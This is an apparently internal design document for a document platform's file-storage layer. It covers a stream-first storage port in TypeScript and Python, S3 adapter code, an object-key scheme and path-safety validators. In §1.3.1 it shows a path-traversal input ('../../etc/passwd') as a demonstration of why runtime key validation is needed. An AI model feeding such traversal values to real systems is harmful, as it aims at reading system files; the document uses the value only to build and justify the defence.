---
dimension: i-storage
title: File storage abstraction + path safety (item J)
m0_items: J
status: reviewed
date: 2026-09-09
reviewed: 2026-09-09
---

# M0 / Item J — File storage abstraction + path safety

> **Integration status (2026-09-12):** Read the [architecture index](../README.md) and its consolidation report before using these examples. Individual review labels do not close cross-document conflicts; no application implementation is verified.

**Scope.** The `FileStorage` port, the object key scheme, the path-safety proof, the local-disk
deployment at `/data/ocr-files`, retention/deletion, the migration path off local disk, and safe
browser delivery.

**Method.** Every number, version, and OS behaviour below was either (a) executed on this
workstation, (b) fetched from vendor documentation this session, or (c) marked `UNVERIFIED:`.
Evidence is cited inline. No fabricated endpoints, model names, or capabilities.

---

## 0. Executive decisions

| # | Decision | Confidence |
|---|---|---|
| J1 | Port is **stream-first** (`ReadableStream<Uint8Array>` / `AsyncIterator[bytes]`). No `Buffer`/`bytes` in any signature. | high |
| J2 | Port surface = `put · get · stat · exists · existsMany · delete · deleteMany · copy · list`. **Presigned URLs are NOT in the port** — separate optional `PresignCapable` interface. | high |
| J3 | Key = `{tenantId}/{yyyy}/{mm}/{shard}/{documentId}/{kind}/{oid}.{ext}`, **lowercase ASCII only**, server-minted, DB is the source of truth for the stored key. | high |
| J4 | The key-minting function accepts **zero strings from the request**. Original filename lives in a DB column and never touches a path. | high |
| J5 | Local adapter: temp+`fsync`+`rename`+**parent-dir fsync**, `O_NOFOLLOW|O_EXCL`, `0700`/`0600`, dedicated mount, `--read-only` container. | high |
| J6 | Deletion = soft-delete row **+** `storage_gc_queue` outbox row in the *same* transaction; async worker hard-deletes bytes. Idempotent `delete`. | high |
| J7 | **MinIO is REJECTED as the migration target.** `minio/minio` is archived (verified). Target is **SeaweedFS 4.46** (Apache-2.0, active) or managed S3/R2. | high |
| J8 | Serving = authorised streaming route only, `attachment` + `nosniff` + allowlisted `Content-Type` + `CSP: sandbox`. SVG rejected at upload. Separate origin at M2. | high |
| J9 | **Identifier decision: `tenantId` and `documentId` are lowercase UUIDv7** (`uuid`, 36 chars, hyphenated), not ULIDs. Per-object ids are ULIDs. See §2.0. | high |
| J10 | Content hash is **our own streaming SHA-256**, canonical in `storage_objects.sha256`. On S3 it is carried as `x-amz-meta-sha256`; S3's `ChecksumAlgorithm` is set to **`CRC32C` + `ChecksumType: FULL_OBJECT`**, never `SHA256`. See §6.2 leak 4. | high |
| J11 | The path-safety validator is **duplicated in Python** (`assert_safe_object_key`) because `NewType` is a runtime no-op. See §1.3.1. | high |

---

## 1. The `FileStorage` port

### 1.1 Why the brief's four verbs are not enough

`put/get/delete/exists` is a key–value store, not a document platform. Each addition below is
justified by a **specific caller** and by the fact that **the two adapters implement it
fundamentally differently** — which is the only legitimate reason to widen a port. Anything that
both adapters would implement identically belongs in application code, not the port.

| Operation | Caller that needs it | Why it must be in the port (not a helper) |
|---|---|---|
| `stat` | Download route: must emit `Content-Length`, `Last-Modified`, `ETag`, and validate `Range` → `416` **without reading bytes**. | S3 = `HeadObject`, one request, zero transfer. Local = `fstat`. Emulating `stat` with `get` would stream a 500 MB PDF to learn its size. |
| `existsMany` | GC reconciler; "is this document fully materialised" check before marking a job complete. | S3 has **no batch HEAD**. The correct S3 impl is *one* `ListObjectsV2` per common prefix; the local impl is one `readdir`. A loop in business logic would be N round-trips. Grouping rule in §1.2.1. |
| `list(prefix)` | Orphan-derivative GC and the backend-migration verifier **only**. Never called on a request path. | S3 pages at 1000 keys with a continuation token; local needs a recursive walk. Completely divergent implementations. Takes a `KeyPrefix`, not an `ObjectKey` — separate validator, §3.2.1. |
| `copy` | Document re-versioning without re-upload; **backend migration**. | S3→S3 is server-side `CopyObject` (no bytes through our process). Local is `get`+`put`. For a 500 MB object that is a ~3-orders-of-magnitude difference in cost and latency. **Caveat the adapter must absorb:** single-request `CopyObject` is capped at 5 GiB; above that the adapter must fall back to multipart `UploadPartCopy`. Callers must never learn this. |
| `deleteMany` | GC of a document with N page images. | S3 `DeleteObjects` accepts **1000 keys per request**. A 800-page PDF's derivatives = 1 request vs 800. **Partial-failure contract in §1.2.2 — this is load-bearing for §5.2.** |
| `put(…, contentLength?)` | Upload route where the size is unknown (chunked transfer). | Two independent S3 constraints force the adapter's hand: a single `PutObject` **requires** `Content-Length`, **and** a single PUT is capped at **5 GB** (verified, AWS CLI reference). Above either, multipart. The adapter must choose; the caller must not know. |
| `get(…, range?)` | PDF viewer / partial re-read of a large scan. | S3 `Range` header vs local `createReadStream({start,end})`. |
| `HEAD` support (via `stat`) | Download managers and some PDF viewers send `HEAD` before a ranged `GET`. | Same divergence as `stat`. The route must export a `HEAD` handler that calls `stat` only — §7.1.1. Without it Next.js synthesises `HEAD` by running `GET` and discarding the body, which opens and streams the whole object for nothing. |

**Deliberately excluded from the port:**

- `presignRead/presignWrite` — see **§6.2 leak 2**. This is the single most dangerous leak.
- `getPath()` / `getLocalPath()` — would hard-couple every caller to the local adapter.
- `mkdir` — directories are an implementation detail of one adapter; S3 has none.
- Multipart part-level control (`createMultipartUpload`, `uploadPart`, `complete`) — hidden inside
  the S3 adapter via `@aws-sdk/lib-storage@3.1128.0`'s `Upload` class. Exposing part numbers would
  put S3's 5 MiB / 10 000-part limits into business logic.

### 1.2 TypeScript port (authoritative)

Target: Node 22 / Next.js 16 App Router. **Web Streams, not Node streams.** Rationale: Next.js
Route Handlers return `Response`, whose `body` is a `ReadableStream<Uint8Array>`; `@aws-sdk/client-s3`
v3 returns `GetObjectCommandOutput.Body` which exposes `transformToWebStream()`. Choosing Web
Streams means the download route is `return new Response(stream, {headers})` with zero adaptation.
`node:stream`'s `Readable.toWeb` / `Readable.fromWeb` bridges the local `fs` side.

> Verified on this machine (`node v22.22.3`): `Readable.toWeb`, `Readable.fromWeb`,
> `FileHandle.readableWebStream`, `FileHandle.createReadStream`, `FileHandle.sync`,
> `FileHandle.datasync`, and `fsp.statfs` all exist as functions.
> Evidence: `/private/tmp/.../scratchpad/probe2.js`.
> **UNVERIFIED:** the house stack pins Node 22.23.1; this workstation has 22.22.3. Patch-level
> difference only; no API in this document is affected.

```ts
// src/domain/storage/types.ts   — domain layer: imports nothing from Next/React/Prisma/aws-sdk

declare const brand: unique symbol;
export type Brand<T, B extends string> = T & { readonly [brand]: B };

export type ObjectKey  = Brand<string, 'ObjectKey'>;
export type KeyPrefix  = Brand<string, 'KeyPrefix'>;   // NOT an ObjectKey; different validator (§3.2.1)
export type TenantId   = Brand<string, 'TenantId'>;
export type DocumentId = Brand<string, 'DocumentId'>;

export const OBJECT_KINDS = ['original', 'page', 'derivative', 'thumbnail', 'export'] as const;
export type ObjectKind = (typeof OBJECT_KINDS)[number];

/** Closed map: sniffed media type -> canonical extension. The ONLY source of `.ext`. */
export const ALLOWED_MEDIA = {
  'application/pdf':  'pdf',
  'image/png':        'png',
  'image/jpeg':       'jpg',
  'image/tiff':       'tif',
  'image/webp':       'webp',
  'text/plain':       'txt',   // export kind only
  'application/json': 'json',  // export kind only
} as const;
export type AllowedMedia = keyof typeof ALLOWED_MEDIA;

/** RFC 7233 semantics: inclusive on both ends. */
export interface ByteRange { readonly start: number; readonly end: number }

export interface ObjectStat {
  readonly key: ObjectKey;
  /**
   * JS `number`, NOT `bigint`. The DB column is BIGINT and Prisma hands back a `bigint`;
   * the APPLICATION LAYER converts once, at the repository boundary, via `Number(row.bytes)`.
   * Rationale: `Number.MAX_SAFE_INTEGER` is 9.007e15 (~9 PB) — four orders of magnitude above
   * any object we will ever store — and mixing `bigint` into arithmetic is a runtime TypeError,
   * not a type error, so it escapes review. See §7.1 for the bug this prevents.
   */
  readonly bytes: number;
  readonly sha256: string | null;      // null only for objects written before checksums existed
  readonly mediaType: AllowedMedia;
  readonly modifiedAt: Date;
}

export interface PutResult {
  readonly key: ObjectKey;
  readonly bytes: number;
  readonly sha256: string;             // lowercase hex, computed while streaming
}

export interface PutOptions {
  readonly mediaType: AllowedMedia;
  /** Omit when unknown (chunked upload). S3 adapter switches to multipart when absent. */
  readonly contentLength?: number;
  /** Expected digest. Adapter aborts and deletes the partial object on mismatch. */
  readonly expectedSha256?: string;
  /** true => fail with StorageError('already-exists') instead of overwriting. */
  readonly ifAbsent?: boolean;
  readonly signal?: AbortSignal;
}

export interface ReadHandle extends AsyncDisposable {
  readonly stat: ObjectStat;
  readonly stream: ReadableStream<Uint8Array>;
}

export type StorageErrorCode =
  | 'not-found' | 'already-exists' | 'checksum-mismatch' | 'quota-exceeded'
  | 'insufficient-space' | 'invalid-key' | 'invalid-range' | 'unavailable'
  | 'too-large'            // stream exceeded MAX_UPLOAD_BYTES with no declared contentLength (§4.4)
  | 'partial-delete';      // deleteMany could not remove every key (§1.2.2)

export class StorageError extends Error {
  constructor(
    readonly code: StorageErrorCode,
    message: string,
    options?: ErrorOptions & { readonly remaining?: readonly ObjectKey[] },
  ) {
    super(message, options);
    this.name = 'StorageError';
    this.remaining = options?.remaining;
  }
  /** Populated only for 'partial-delete': the keys that still exist. */
  readonly remaining?: readonly ObjectKey[];
}

/**
 * Error MESSAGES cross layer boundaries and reach logs, and sometimes 500 bodies. They therefore
 * MUST NOT contain an absolute filesystem path, a full ObjectKey, or an original filename.
 * Use the code plus a non-identifying discriminator; put the key in structured log context under
 * an access-controlled field, never in `message`.
 */

export interface ListPage {
  readonly keys: readonly ObjectKey[];
  readonly cursor: string | null;      // opaque; S3 continuation token / local walk position
}

export interface FileStorage {
  /**
   * Streams `body` to `key`. MUST NOT buffer the whole body — a 500 MB PDF flows through in
   * bounded memory (local: 64 KiB fs chunks; S3: `lib-storage` queues `partSize` buffers with
   * `queueSize` concurrency, so peak RSS = partSize * queueSize, NOT the object size).
   */
  put(key: ObjectKey, body: ReadableStream<Uint8Array>, options: PutOptions): Promise<PutResult>;

  /** Caller MUST `await using` the handle (or call `Symbol.asyncDispose`) to release the fd / socket. */
  get(key: ObjectKey, options?: { range?: ByteRange; signal?: AbortSignal }): Promise<ReadHandle>;

  stat(key: ObjectKey): Promise<ObjectStat | null>;
  exists(key: ObjectKey): Promise<boolean>;
  existsMany(keys: readonly ObjectKey[]): Promise<ReadonlyMap<ObjectKey, boolean>>;

  /** IDEMPOTENT. Deleting a nonexistent key resolves successfully. Required by the GC design (§5.2). */
  delete(key: ObjectKey): Promise<void>;

  /**
   * ALL-OR-THROW. See §1.2.2. Resolving means EVERY key is gone. Any per-key failure MUST be
   * rethrown as StorageError with the surviving keys attached. §5.2's correctness depends on this.
   */
  deleteMany(keys: readonly ObjectKey[]): Promise<void>;

  /** Server-side where the backend supports it. Adapter handles the S3 5 GiB CopyObject ceiling. */
  copy(from: ObjectKey, to: ObjectKey, options?: { ifAbsent?: boolean }): Promise<PutResult>;

  /** GC + migration only. `KeyPrefix` has its OWN validator (§3.2.1) — a prefix is not a key. */
  list(prefix: KeyPrefix, options?: { cursor?: string | null; limit?: number }): Promise<ListPage>;
}

/**
 * OPTIONAL capability. Deliberately NOT part of FileStorage.
 * Only the HTTP/infrastructure layer may feature-detect it. Domain and application code MUST NOT
 * reference this type — enforced by dependency-cruiser (§7.2).
 */
export interface PresignCapable {
  presignRead(key: ObjectKey, ttlSeconds: number): Promise<URL>;
}
export function isPresignCapable(s: FileStorage): s is FileStorage & PresignCapable {
  return typeof (s as Partial<PresignCapable>).presignRead === 'function';
}
```

**On `AsyncDisposable`:** `get` returns a handle, not a bare stream, because both adapters hold an
OS resource (a file descriptor; an undici socket). `await using h = await storage.get(k)`
guarantees release on early return or throw. Returning a bare `ReadableStream` leaks fds under
aborted downloads — a slow-loris client aborting 10 000 downloads exhausts the fd table.

### 1.2.1 `existsMany` — the S3 implementation, spelled out

"S3 has no batch HEAD" is true but is not an implementation. The adapter does this:

```ts
// group by the DOCUMENT prefix (the first 5 segments), which is where keys actually cluster
async existsMany(keys: readonly ObjectKey[]): Promise<ReadonlyMap<ObjectKey, boolean>> {
  const out = new Map(keys.map((k) => [k, false] as const));
  const byPrefix = new Map<string, ObjectKey[]>();
  for (const k of keys) {
    const p = k.split('/').slice(0, 5).join('/') + '/';   // tenant/yyyy/mm/shard/documentId/
    (byPrefix.get(p) ?? byPrefix.set(p, []).get(p)!).push(k);
  }

  // THRESHOLD, not a vibe: one ListObjectsV2 returns up to 1000 keys for one request. A document
  // with <=1000 objects is therefore 1 request whatever the group size, so listing wins whenever
  // a prefix group holds >1 key. A group of exactly 1 is cheaper as a HeadObject (no XML parse,
  // no 1000-key transfer), so:
  await Promise.all([...byPrefix].map(async ([prefix, group]) => {
    if (group.length === 1) {
      out.set(group[0]!, await this.exists(group[0]!));   // HeadObject
      return;
    }
    const seen = new Set<string>();
    let token: string | undefined;
    do {
      const r = await this.s3.send(new ListObjectsV2Command({
        Bucket: this.bucket, Prefix: prefix, ContinuationToken: token, MaxKeys: 1000,
      }));
      for (const o of r.Contents ?? []) if (o.Key) seen.add(o.Key);
      token = r.IsTruncated ? r.NextContinuationToken : undefined;
    } while (token);                                     // >1000 objects per document is handled
    for (const k of group) out.set(k, seen.has(k));
  }));
  return out;
}
```

Two properties the caller depends on: the returned map contains **every** requested key (missing
ones map to `false`, never absent), and the method never returns `true` for a key it did not
literally observe. The 5-segment grouping is coupled to §2.1's template; if the template changes,
this constant changes with it, which is why both live in this document.

### 1.2.2 `deleteMany` — the partial-failure contract

**S3 `DeleteObjects` returns HTTP 200 with a per-key `Errors[]` array.** A naive adapter that only
checks the HTTP status reports success while objects survive. §5.2's GC marks all 1000 queue rows
`completedAt` immediately after `deleteMany` resolves — so a swallowed per-key error produces
exactly the orphan-file outcome §5.1 declares unacceptable, silently and permanently.

```ts
async deleteMany(keys: readonly ObjectKey[]): Promise<void> {
  const failed: ObjectKey[] = [];
  for (const chunk of chunksOf(keys, 1000)) {          // S3 hard limit: 1000 per request
    const r = await this.s3.send(new DeleteObjectsCommand({
      Bucket: this.bucket, Delete: { Objects: chunk.map((k) => ({ Key: k })), Quiet: true },
    }));
    // Quiet:true suppresses the successes, NOT the errors. Errors[] is still populated.
    for (const e of r.Errors ?? []) if (e.Key) failed.push(e.Key as ObjectKey);
  }
  if (failed.length) {
    throw new StorageError('partial-delete',
      `${failed.length}/${keys.length} objects not deleted`, { remaining: failed });
  }
}
```

The local adapter's equivalent swallows `ENOENT` (idempotency) and collects every other errno into
`failed`. §5.2 is amended to consume `error.remaining` rather than assuming all-or-nothing.

### 1.3 Python port (OCR worker)

The Python worker needs a strict subset: read the original, write page images and derivatives,
stat, delete. It does **not** need `list`, `copy`, or `existsMany` — those are orchestrator
concerns. Narrower port = smaller blast radius.

Versions verified against PyPI this session: `boto3 1.43.90`, `aioboto3 15.5.0`,
`aiofiles 25.1.0`, `python-ulid 4.0.1`, `python-magic 0.4.27`.

> **Python version is now RESOLVED, not merely inferred.** This workstation has only system
> Python 3.9.6 (`/usr/bin/python3`), no pyenv/conda. Three independent constraints force 3.10+:
> (a) `X | None` unions in annotations and `slots=True` on dataclasses are **3.10+**;
> (b) verified from PyPI this session, **`boto3 1.43.90` declares `requires_python >=3.10`** and
> **`python-ulid 4.0.1` declares `>=3.10`** — they will not install on 3.9.6 at all;
> (c) `aioboto3 15.5.0` and `aiofiles 25.1.0` declare `>=3.9` and so do not constrain.
> The worker container therefore pins **Python 3.13** (3.12 acceptable). This is no longer an
> open question; it is a dependency fact. The host's 3.9.6 is a dev-shell artefact only.

```python
# ocr_worker/storage/port.py
from __future__ import annotations

from collections.abc import AsyncIterator
from contextlib import AbstractAsyncContextManager
from dataclasses import dataclass
from datetime import datetime
from typing import Literal, NewType, Protocol, runtime_checkable

ObjectKey = NewType("ObjectKey", str)
ObjectKind = Literal["original", "page", "derivative", "thumbnail", "export"]
AllowedMedia = Literal[
    "application/pdf", "image/png", "image/jpeg",
    "image/tiff", "image/webp", "text/plain", "application/json",
]


@dataclass(frozen=True, slots=True)
class ObjectStat:
    key: ObjectKey
    bytes: int
    sha256: str | None
    media_type: AllowedMedia
    modified_at: datetime


@dataclass(frozen=True, slots=True)
class PutResult:
    key: ObjectKey
    bytes: int
    sha256: str


@dataclass(frozen=True, slots=True)
class ByteRange:
    start: int
    end: int  # inclusive


class StorageError(Exception):
    def __init__(self, code: str, message: str) -> None:
        super().__init__(message)
        self.code = code


@runtime_checkable
class FileStorage(Protocol):
    async def put(
        self,
        key: ObjectKey,
        body: AsyncIterator[bytes],
        *,
        media_type: AllowedMedia,
        content_length: int | None = None,
        expected_sha256: str | None = None,
        if_absent: bool = False,
    ) -> PutResult:
        """Stream `body` to `key`. MUST NOT materialise the body in memory."""
        ...

    def get(
        self,
        key: ObjectKey,
        *,
        byte_range: ByteRange | None = None,
    ) -> AbstractAsyncContextManager[tuple[ObjectStat, AsyncIterator[bytes]]]:
        """
        Async CONTEXT MANAGER, not a coroutine returning a stream. Deterministic close of the
        file descriptor / HTTP response is mandatory:

            async with storage.get(key) as (stat, chunks):
                async for chunk in chunks:
                    ...
        """
        ...

    async def stat(self, key: ObjectKey) -> ObjectStat | None: ...
    async def exists(self, key: ObjectKey) -> bool: ...
    async def delete(self, key: ObjectKey) -> None:
        """IDEMPOTENT: deleting a missing key is success."""
        ...
```

### 1.3.1 The Python validator — why the TypeScript proof does NOT carry over

**`ObjectKey = NewType("ObjectKey", str)` is a type-checker fiction with no runtime effect.**
Verified this session:

```
>>> typing.NewType('K', str)('../../etc/passwd')
'../../etc/passwd'
```

`NewType` returns its argument unchanged. It is *not* the Python analogue of the TypeScript brand:
the TS brand is at least checked at compile time across the whole app by `tsc` in CI, whereas the
Python worker is a separate process that receives keys **over the queue as JSON strings** and can
be run with no type checker at all. Every path-safety guarantee proved in §3 is therefore
TypeScript-only until the same validation exists in Python. The worker writes `page`,
`thumbnail`, and `derivative` objects to the same local tree, so this is not a theoretical gap —
it is the *other half* of the write surface.

**Two Python-specific traps a naive port of `KEY_RE` walks straight into:**

1. **`$` matches before a trailing newline in Python `re`, unlike JavaScript.** Verified:

   ```
   re.match(r'^[0-9a-z](?:[0-9a-z._\-/]*[0-9a-z])?$', 'ab\n')   -> matches   (WRONG)
   re.match(r'^[0-9a-z](?:[0-9a-z._\-/]*[0-9a-z])?\Z', 'ab\n')  -> None      (correct)
   ```
   A key with a trailing newline would pass a transliterated validator and then be written to
   disk, log-injected, or embedded in an S3 request line. Use `\Z`, and use `re.fullmatch`.
2. **`str` in Python is a sequence of codepoints, and `os.fsencode` will happily encode
   surrogates** under `surrogateescape`. The ASCII allowlist below forecloses this, but the
   validator must run on the `str` *before* any `os.path` call, never on `bytes`.

```python
# ocr_worker/storage/keys.py  -- MUST be applied to EVERY key entering the worker.
import re

_KEY_RE = re.compile(r"[0-9a-z](?:[0-9a-z._\-/]*[0-9a-z])?")   # used with fullmatch
_KEY_MAX = 512
_SEG_MAX = 64
_SEGMENTS = 7
_RESERVED_WIN = frozenset(
    ["con", "prn", "aux", "nul"]
    + [f"com{i}" for i in range(1, 10)]
    + [f"lpt{i}" for i in range(1, 10)]
)


def assert_safe_object_key(raw: object) -> ObjectKey:
    """Runtime twin of assertSafeObjectKey (TS, §3.2). Keep the two in lockstep."""
    if not isinstance(raw, str):
        raise StorageError("invalid-key", "key must be str")
    if not 0 < len(raw) <= _KEY_MAX:
        raise StorageError("invalid-key", "key length out of range")
    # fullmatch + no '$': immune to the trailing-newline gotcha above.
    if _KEY_RE.fullmatch(raw) is None:
        raise StorageError("invalid-key", "byte outside the ASCII allowlist")
    if "//" in raw:
        raise StorageError("invalid-key", "empty path segment")
    segments = raw.split("/")
    if len(segments) != _SEGMENTS:
        raise StorageError("invalid-key", "wrong segment count")
    for seg in segments:
        if not 0 < len(seg) <= _SEG_MAX:
            raise StorageError("invalid-key", "segment length out of range")
        # NOT redundant -- see the TS note at §3.2 step (4a): the anchors bind the whole string,
        # not each segment, so 'a/../b' satisfies the regex.
        if seg in (".", ".."):
            raise StorageError("invalid-key", "path traversal segment")
        if seg[0] in ".-":
            raise StorageError("invalid-key", "segment starts with '.' or '-'")
        if seg.split(".", 1)[0] in _RESERVED_WIN:
            raise StorageError("invalid-key", "reserved device name")
    return ObjectKey(raw)
```

The worker's local adapter additionally repeats the §3.4 containment check with
`os.path.realpath` + `os.path.commonpath`, and opens with
`os.open(p, os.O_RDONLY | os.O_NOFOLLOW)`. The worker **never mints keys** — key minting is
TypeScript-only (§3.1), and the worker receives every key it uses from the job payload, which is
itself populated from `storage_objects`.

**Streaming proof, Python side.** A 500 MB PDF is read page-by-page by the OCR engine. The worker
never calls `.read()` without a size:

```python
CHUNK = 1 << 16  # 64 KiB

async def stream_original_to_tempfile(storage: FileStorage, key: ObjectKey, dst: Path) -> str:
    """Peak RSS is one CHUNK, regardless of object size."""
    import hashlib, aiofiles
    digest = hashlib.sha256()
    async with storage.get(key) as (_stat, chunks):
        async with aiofiles.open(dst, "wb") as fh:
            async for chunk in chunks:      # adapter yields <= CHUNK bytes
                digest.update(chunk)
                await fh.write(chunk)
    return digest.hexdigest()
```

The corresponding anti-pattern, which must be banned by review and by a lint rule:
`body = await resp["Body"].read()` (boto3) and `await response.content.read()` (aiohttp) both
materialise the entire object.

---

## 2. Object key scheme

### 2.0 Identifier decision (resolves a contradiction in the first draft)

The first draft specified 26-char lowercase ULIDs for `tenantId`/`documentId` in §2.1 while the
Prisma model in §2.3 declared both as `@db.Uuid`. Those are incompatible — a UUID is 36 characters
with hyphens, a ULID is 26 Crockford-base32 characters — and the key-length arithmetic, `SEG_MAX`,
and the shard input all depend on which is true. **Resolved as follows:**

| Identifier | Type | Rendering in a key | Why |
|---|---|---|---|
| `tenantId`, `documentId` | **UUIDv7**, `@db.Uuid` | 36 chars, lowercase hex + hyphens | They are **primary keys in Postgres**. `uuid` is a native 16-byte type with its own index support; storing a ULID would mean either a `CHAR(26)` PK (26 bytes, worse index density, no native type) or a lossy conversion at every boundary. UUIDv7 keeps the time-ordered insert locality that motivated ULID in the first place. |
| per-object id (`oid`) | **ULID** | 26 chars, lowercased | Not a PK — it exists only to make the key unique within a `{documentId}/{kind}/` directory. Never joined on, never indexed. The shorter, hyphen-free, base32 rendering is strictly better *in a path*. |

`-` is already in the key alphabet (`KEY_RE`, §3.2), and a lowercase UUID's hyphens fall in the
middle of a segment, so no validator rule changes. A segment never starts or ends with `-`.

*Rejected alternative:* ULIDs as PKs throughout, for a single consistent id shape. It buys
cosmetic uniformity at the cost of the native `uuid` type, `gen_random_uuid()`/`uuidv7()`
server-side defaults, and every tool that pretty-prints UUIDs. *Would flip if:* keys ever needed
to be hand-typed or read aloud, or if we adopted a datastore with no UUID type.

### 2.1 The template

```
{tenantId}/{yyyy}/{mm}/{shard}/{documentId}/{kind}/{oid}.{ext}

tenantId   36 chars  lowercase hyphenated UUIDv7   (Postgres PK, §2.0)
yyyy        4 digits  UTC year of document creation
mm          2 digits  UTC month, zero-padded
shard       2 chars   lowercase hex = sha256(documentId).hex[0:2]   -> 256 buckets
documentId 36 chars  lowercase hyphenated UUIDv7
kind        one of: original | page | derivative | thumbnail | export   (4-10 chars)
oid        26 chars  lowercase ULID, minted per object (NOT a PK, §2.0)
ext        from ALLOWED_MEDIA, 3-4 chars

example (all synthetic ids):
0199c3a1-7b2e-7f41-9c3d-5e6f70819a2b/2026/09/7a/0199c3a1-8c40-7d12-b6e5-1f2a3b4c5d6e/page/01k9v3m2ra9s8d7f6g5h4j3k2l.png

length with kind=page:       36+1+4+1+2+1+2+1+36+1+4+1+26+1+3 = 120 chars
length with kind=derivative: 126 chars   <- the maximum
headroom: KEY_MAX is 512 (§3.2); S3's own hard limit is 1024 UTF-8 bytes.
The key is pure ASCII, so chars == bytes and the two limits are directly comparable.
```

### 2.2 Justification against each stated criterion

**Sharding / directory fan-out on local disk.** Without `{shard}`, a tenant ingesting 100 000
documents in one month produces 100 000 sibling directories under `{tenant}/2026/09/`. ext4 with
`dir_index` (htree) handles lookups fine, but the GC reconciler's `readdir` + per-entry `stat` over
a 100 000-entry directory is the operational pain — and `getdents64` on such a directory is a
multi-second stall that blocks the event loop's threadpool. With 256 shards the same month holds
**~390 entries per shard directory**, which `readdir` returns in a single syscall buffer.

*The shard must be a hash, not a prefix of the id.* **UUIDv7 and ULID share the same hazard here:
both encode a 48-bit millisecond timestamp in their leading bits**, so both are lexicographically
time-ordered and every document created in a given month shares its first ~7 characters
(UUIDv7: `0199c3a1-…` for the whole of a month; ULID: `01k9v3…`). Sharding on `documentId[0:2]`
would place an entire month in one or two buckets — worse than no sharding, because it adds a
level of indirection for nothing. `sha256(documentId)[0:2]` is uniform.
**This is a concrete, easy-to-make mistake and the reason the shard is spelled out rather than
left to the implementer** — and note that switching the PK from ULID to UUIDv7 (§2.0) does *not*
make the naive prefix-shard safe, because the property is a property of time-ordered ids in
general, not of one encoding.

*Corollary the implementer must not miss:* the shard is `sha256` of the **canonical lowercase
hyphenated UUID string**, not of its 16 raw bytes and not of an uppercase rendering. `mintObjectKey`
lowercases before hashing (§3.1). Hashing a different representation silently relocates every
future object of an existing document, orphaning its predecessors under a prefix nothing scans.

**S3 prefix throughput.** AWS documents *"at least 3,500 PUT/COPY/POST/DELETE or 5,500 GET/HEAD
requests per second per partitioned Amazon S3 prefix. There are no limits to the number of prefixes
in a bucket."* (verified: <https://docs.aws.amazon.com/AmazonS3/latest/userguide/optimizing-performance.html>).
Two consequences:

1. The pre-2018 advice to put a random hash **first** in the key is obsolete — S3 now partitions
   adaptively on any prefix. Hash-first is therefore **rejected**: it would destroy per-tenant
   listing and per-tenant IAM for no throughput benefit.
2. Our `{shard}` segment still helps on S3 as a *scaling accelerant*: AWS notes scaling "happens
   gradually and is not instantaneous" and emits `503 (Slow Down)` while repartitioning. Pre-existing
   fan-out at the shard level gives S3 256 partitionable prefixes per tenant-month from day one.

**Listing by tenant.** `tenantId` leads, so `list('{tenantId}/')` is a single prefix scan, and an
S3 IAM policy can scope a per-tenant role with `"Resource": "arn:aws:s3:::bucket/{tenantId}/*"`.
This is why the date does **not** lead. *Rejected alternative:* `{yyyy}/{mm}/{tenantId}/…` — makes
per-tenant export, per-tenant erasure (PDPA), and per-tenant IAM require a full-bucket scan.

**Deletion by document.** The document's objects are contiguous under
`{tenant}/{yyyy}/{mm}/{shard}/{documentId}/`. In practice deletion does **not** use a prefix scan —
it uses the explicit key list from `storage_objects` (§5.2), because a prefix scan is eventually
racy against an in-flight upload. The prefix contiguity exists as the **GC fallback** and as the
orphan-detection scan.

**Not leaking the original filename.** The key contains no user-supplied byte. `{oid}` is minted
server-side; `{ext}` comes from the closed `ALLOWED_MEDIA` map keyed on the **sniffed** media type,
not the uploaded name. `รายงานประจำปี ๒๕๖๙.pdf` — note the Thai digits ๒๕๖๙ (U+0E52 U+0E55 U+0E56
U+0E59), which are *not* in the `U+0E00..U+0E7F` consonant/vowel range people usually think of as
"Thai" but are rejected by the same ASCII allowlist — is stored in `documents.original_filename`
as an opaque display string and appears on disk nowhere. Consequences: no information disclosure
via directory listing or S3 inventory report, no encoding hazard on any filesystem, and no
`Content-Disposition` value that can be derived from a path.

**Why include `.ext` at all,** given the media type is in the DB? Three operational reasons: `file`
and `ls` on the mount are readable during incidents; the S3 console previews correctly; and
CDN/object-inspection tooling behaves. It is **advisory only** — §7.2 states that `Content-Type` on
the download response comes from the DB column and never from the extension.

**Lowercase-only alphabet.** Crockford base32 ULIDs are conventionally uppercase; we lowercase them.
Motivation is empirical, see §3 attack 9: this workstation's APFS root is case-insensitive, so
`…/ABC.pdf` and `…/abc.pdf` collide here but not on the ext4 production host. A lowercase-only
alphabet makes case collisions **structurally impossible** and makes macOS dev behaviour identical
to Linux production. Cost: 5 bits of alphabet per character lost — irrelevant, ULID entropy is 80
random bits regardless of case rendering.

### 2.3 The DB is the source of truth for the key

The template is used **only at mint time**. Every object's full key is persisted, so the template
may be changed later without a migration and without any code being able to "recompute" a legacy
key incorrectly.

```prisma
// prisma/schema.prisma  — Prisma 7.9.1, @prisma/adapter-pg
enum ObjectKind { original page derivative thumbnail export }

model StorageObject {
  id         String    @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
  tenantId   String    @map("tenant_id")   @db.Uuid
  documentId String    @map("document_id") @db.Uuid
  kind       ObjectKind
  objectKey  String    @unique @map("object_key") @db.VarChar(512)
  mediaType  String    @map("media_type") @db.VarChar(100)
  bytes      BigInt
  sha256     String    @db.Char(64)
  createdAt  DateTime  @default(now()) @map("created_at") @db.Timestamptz(6)
  deletedAt  DateTime? @map("deleted_at") @db.Timestamptz(6)

  @@index([documentId, kind])
  @@index([tenantId, createdAt])
  // Content-addressed dedup/idempotency (§3.3 attack 7, Defence 3). WITHOUT this index that
  // defence is prose. Scoped to (tenantId, sha256) and NOT to sha256 alone: a global unique
  // index would let tenant A discover, by insert conflict, that tenant B holds a given file --
  // a cross-tenant existence oracle. Partial, so soft-deleted rows do not block re-upload.
  @@index([tenantId, sha256, kind])
  @@map("storage_objects")
}
```

```sql
-- Prisma cannot express the partial predicate; add it as a raw migration alongside the model.
CREATE UNIQUE INDEX storage_objects_tenant_sha256_original_uq
  ON storage_objects (tenant_id, sha256)
  WHERE kind = 'original' AND deleted_at IS NULL;
```

`bytes BigInt` not `Int`: a 500 MB PDF is 5.24e8, within int4's 2.1e9 — but a multi-GB TIFF batch
export is not. Cheap insurance.

**The `BigInt` boundary rule.** Prisma maps `BigInt` to a JavaScript `bigint`, and JS throws
`TypeError: Cannot mix BigInt and other types, use explicit conversions` on any arithmetic that
mixes it with `number` (verified in `node v22.22.3` this session). That is a **runtime** failure
`tsc` does not catch when the value arrives as `any` from a raw query or a loosely-typed select.
The rule is therefore: **convert once, in the repository, never in the route** —
`bytes: Number(row.bytes)` — so that `ObjectStat.bytes` and every downstream consumer
(`parseRangeHeader`, `Content-Length`, `Content-Range`, the quota arithmetic) sees a `number`.
